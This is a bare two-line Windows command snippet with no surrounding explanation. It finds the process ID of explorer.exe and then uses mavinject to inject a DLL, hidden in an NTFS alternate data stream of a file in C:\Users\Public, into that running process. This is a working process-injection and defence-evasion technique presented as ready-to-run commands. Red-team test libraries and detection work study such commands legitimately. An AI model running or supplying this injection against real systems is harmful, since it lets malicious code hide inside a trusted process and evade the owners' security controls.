for /f "TOKENS=1" %a in ('wmic PROCESS where "Name='explorer.exe'" get ProcessID ^| findstr [0-9]') do set ExpPID=%a
mavinject %ExpPID% /INJECTRUNNING C:\Users\Public\sysinfo.inf:dec.dll
